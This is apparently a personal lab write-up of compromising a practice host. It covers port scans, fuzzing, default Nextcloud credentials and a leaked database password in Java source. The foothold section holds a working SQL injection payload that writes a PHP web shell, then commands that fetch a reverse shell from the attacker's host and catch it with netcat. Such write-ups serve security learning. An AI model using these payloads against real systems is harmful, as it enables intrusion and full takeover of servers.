## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.115.147

# HOSTNAME

# OPERATING SYSTEM

# CREDENTIALS  

```
## OPEN PORTS DETAILS
```bash
22/tcp    open   ssh          syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
17445/tcp open   unknown      syn-ack ttl 61
30455/tcp open   http         syn-ack ttl 61 nginx 1.18.0
50080/tcp open   http         syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.15)

```
# ENUMERATION
```bash
# HTTP PORT 17445
17445/tcp open   unknown      syn-ack ttl 61

# HTTP PORT 30455
30455/tcp open   http         syn-ack ttl 61 nginx 1.18.0
- Found Files
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -of md -o fuzz/ffuf-raft-large-files -fc 403,404 -u $url/FUZZ
index.php               [Status: 200, Size: 3356, Words: 409, Lines: 122, Duration: 43ms]
phpinfo.php             [Status: 200, Size: 68628, Words: 3339, Lines: 744, Duration: 39ms]


# HTTP PORT 50080
50080/tcp open   http         syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
- Fuzzing Findings 
sudo ffuf -c  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -of md -o fuzz/ffuf-raft-large-directories -fc 403,404 -u $url/FUZZ/
icons                   [Status: 200, Size: 73983, Words: 7383, Lines: 1005, Duration: 41ms]
images                  [Status: 200, Size: 1533, Words: 138, Lines: 19, Duration: 4559ms]
cloud                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1138ms]
index.html              [Status: 200, Size: 9088, Words: 1204, Lines: 193, Duration: 39ms]

- Found nextcloud login page
http://192.168.115.147:50080/cloud
- default creds admin:admin - worked
- Found issuetracker.zip at http://192.168.115.147:50080/cloud/index.php/apps/files/?dir=/&
- download and unzip issuetracker.zip
- Found credentials at issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java
- issue_user:ManagementInsideOld797

# SSH
22/tcp    open   ssh          syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)

```
## FOOTHOLD
```bash
# Analysing source code issuetracker/src/main/java/com/issue/tracker/issues/IssueController.java
       @GetMapping("/issue/checkByPriority")
        public String checkByPriority(@RequestParam("priority") String priority, Model model) {
                // 
                // Custom code, need to integrate to the JPA
                //
            Properties connectionProps = new Properties();
            connectionProps.put("user", "issue_user");
            connectionProps.put("password", "ManagementInsideOld797");
        try {
                        conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/issue_tracker",connectionProps);
                    String query = "SELECT message FROM issue WHERE priority='"+priority+"'";


# Overview
- Issue tracker page executes this query from database SELECT message FROM issue WHERE priority='"+priority+"'
- Query execution url http://192.168.115.147:17445/issue/checkByPriority?priority=
- Trying SQLi using burpsuite http://192.168.115.147:17445/issue/checkByPriority?priority='UNION SELECT SLEEP(5);-- -
- Response - Method not allowed
- Changing the Request to POST method
- SQLi works

POST /issue/checkByPriority HTTP/1.1
Host: 192.168.115.147:17445
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=FCEE93CBFC1A6D24DFA2F8CDAEDBA771
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

priority='UNION%20SELECT%20SLEEP(5)%3b--%20-

# Checking the server root folder on http://192.168.115.147:30455/phpinfo.php
- /srv/http

# SQLi to RCE
# SQLi Payload 
'UNION SELECT "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE '/srv/http/backdoor.php';-- -'

priority='UNION%20SELECT%20%22%3c%3fphp%20echo%20shell_exec(%24_GET%5b'cmd'%5d)%3b%3f%3e%22%20into%20OUTFILE%20'%2fsrv%2fhttp%2fbackdoor.php'%3b--%20-

# Curl
curl http://192.168.115.147:30455/backdoor.php?cmd=id
uid=0(root) gid=0(root) groups=0(root)

# Proper Shell
cp /usr/share/laudanum/php/php-reverse-shell.php ./shell.txt

edit LHOST LPORT

sudo python3 -m http.server 443

curl 'http://192.168.115.147:30455/backdoor.php?cmd=wget http://192.168.45.212:443/shell.txt -O /srv/http/rev.php'
sudo nc -nvlp 443
curl http://192.168.115.147:30455/rev.php

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Tue Nov 19 05:04:29 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.115.147

PORT      STATE  SERVICE      REASON         VERSION
22/tcp    open   ssh          syn-ack ttl 61 OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 78:2f:ea:84:4c:09:ae:0e:36:bf:b3:01:35:cf:47:22 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDj3RK6xsdeO4e9FcGxkWDFkLF6hB7c+1AvLuouW7Hb9yCluZ2mIoIHBm8p8+h8ZefUURi9GirIwsti4lQdcIxKwGepWKjj9/yTKe/sNEWugWUhA2+twlcG16FWSt83UenfW9L8pJ7swSobVFWl3bLcig9vBZxRcP4S90lskZ00v7+ivglQ5ZhUEfbOm4QG9ygqY4pLTFN2jf/z91XhoTANWOrKZNOb+ESbspGxQTEUCHwVNrODS6BDqTTWNj2gZlB3rR3OxkHAiOvBaiKmt3o3IKegyx2LnjnG1s5JxjfjsV3DDesEqgB5TPfLF9SM3ablgqyBvHr1XeMWmqpQoSanb8+oNzQBmodmiARh1ScZQ4YdlAXuZPGae5bgIoCKWj8fWpxAtjvEt1GuoBmfSUrX2IZ0F+TuGLp6r2QZAAyBCc6DkZyisSVRBqgSHiCcUSMMX1s4Q+3ejdMKQdr/sio1F3KrqcxRus9r7QNHe9aPHZQvgqtfILrtRHpCLS1nESk=
|   256 d2:7d:eb:2d:a5:9a:2f:9e:93:9a:d5:2e:aa:dc:f4:a6 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKlBMKDw3CXTIbkuaAnYiGGEVUj1gx8Cx0sCphpMw8LfYEwRT39bv6O6K/4/IRdx/55N+IZs9C15K5SoHJbACVI=
|   256 b6:d4:96:f0:a4:04:e4:36:78:1e:9d:a5:10:93:d7:99 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAID8bIayyvqAHx2g8sE1rJUia1dcCXeTm0bR6MkIuzYIq

111/tcp   closed rpcbind      reset ttl 61
139/tcp   closed netbios-ssn  reset ttl 61
443/tcp   closed https        reset ttl 61
445/tcp   closed microsoft-ds reset ttl 61

17445/tcp open   unknown      syn-ack ttl 61
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Type: text/html;charset=UTF-8
|     Content-Language: en-US
|     Date: Mon, 18 Nov 2024 23:36:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Issue Tracker</title>
|     <link href="/css/bootstrap.min.css" rel="stylesheet" />
|     </head>
|     <body>
|     <section>
|     <div class="container mt-4">
|     <span>
|     <div>
|     href="/login" class="btn btn-primary" style="float:right">Sign In</a> 
|     href="/register" class="btn btn-primary" style="float:right;margin-right:5px">Register</a>
|     </div>
|     </span>
|     <br><br>
|     <table class="table">
|     <thead>
|     <tr>
|     <th>ID</th>
|     <th>Message</th>
|     <th>P
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET,HEAD,OPTIONS
|     X-Content-Type-Options: nosniff
|     X-XSS-Protection: 1; mode=block
|     Cache-Control: no-cache, no-store, max-age=0, must-revalidate
|     Pragma: no-cache
|     Expires: 0
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Date: Mon, 18 Nov 2024 23:36:27 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Mon, 18 Nov 2024 23:36:27 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>

30455/tcp open   http         syn-ack ttl 61 nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: W3.CSS
| http-methods: 
|_  Supported Methods: GET HEAD POST

50080/tcp open   http         syn-ack ttl 61 Apache httpd 2.4.46 ((Unix) PHP/7.4.15)
|_http-title: W3.CSS Template
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.15

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port17445-TCP:V=7.94SVN%I=7%D=11/19%Time=673BCF7C%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,623,"HTTP/1\.1\x20200\x20\r\nX-Content-Type-Options:\x20n
SF:osniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Control:\x20no
SF:-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPragma:\x20no-
SF:cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent-Type:\x20
SF:text/html;charset=UTF-8\r\nContent-Language:\x20en-US\r\nDate:\x20Mon,\
SF:x2018\x20Nov\x202024\x2023:36:27\x20GMT\r\nConnection:\x20close\r\n\r\n
SF:\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\t<head>\n\x20\x20\x20\x20
SF:\t<meta\x20charset=\"UTF-8\">\n\x20\x20\x20\x20\t<title>Issue\x20Tracke
SF:r</title>\n\t\t<link\x20href=\"/css/bootstrap\.min\.css\"\x20rel=\"styl
SF:esheet\"\x20/>\n\t</head>\n\t<body>\n\t\x20\x20\x20\x20<section>\n\t\t<
SF:div\x20class=\"container\x20mt-4\">\n\t\t\t<span>\n\x20\t\t\t\n\t\x20\x
SF:20\x20\x20\x20\x20\x20\x20<div>\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a
SF:\x20href=\"/login\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:ri
SF:ght\">Sign\x20In</a>\x20\n\t\x20\x20\x20\x20\x20\x20\x20\x20\t<a\x20hre
SF:f=\"/register\"\x20class=\"btn\x20btn-primary\"\x20style=\"float:right;
SF:margin-right:5px\">Register</a>\n\t\x20\x20\x20\x20\x20\x20\x20\x20</di
SF:v>\n\x20\x20\x20\x20\x20\x20\x20\x20</span>\n\t\t\t<br><br>\n\t\t\t<tab
SF:le\x20class=\"table\">\n\t\t\t<thead>\n\t\t\t\t<tr>\n\t\t\t\t\t<th>ID</
SF:th>\n\t\t\t\t\t<th>Message</th>\n\t\t\t\t\t<th>P")%r(HTTPOptions,12B,"H
SF:TTP/1\.1\x20200\x20\r\nAllow:\x20GET,HEAD,OPTIONS\r\nX-Content-Type-Opt
SF:ions:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nCache-Cont
SF:rol:\x20no-cache,\x20no-store,\x20max-age=0,\x20must-revalidate\r\nPrag
SF:ma:\x20no-cache\r\nExpires:\x200\r\nX-Frame-Options:\x20DENY\r\nContent
SF:-Length:\x200\r\nDate:\x20Mon,\x2018\x20Nov\x202024\x2023:36:27\x20GMT\
SF:r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,"HTTP/1\.1\x20400\x
SF:20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent-Language:\x20
SF:en\r\nContent-Length:\x20435\r\nDate:\x20Mon,\x2018\x20Nov\x202024\x202
SF:3:36:27\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x
SF:20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad
SF:\x20Request</title><style\x20type=\"text/css\">body\x20{font-family:Tah
SF:oma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{color:white;backgr
SF:ound-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20{font-size:16p
SF:x;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\x20a\x20{color
SF::black;}\x20\.line\x20{height:1px;background-color:#525D76;border:none;
SF:}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\
SF:x20Request</h1></body></html>");

```

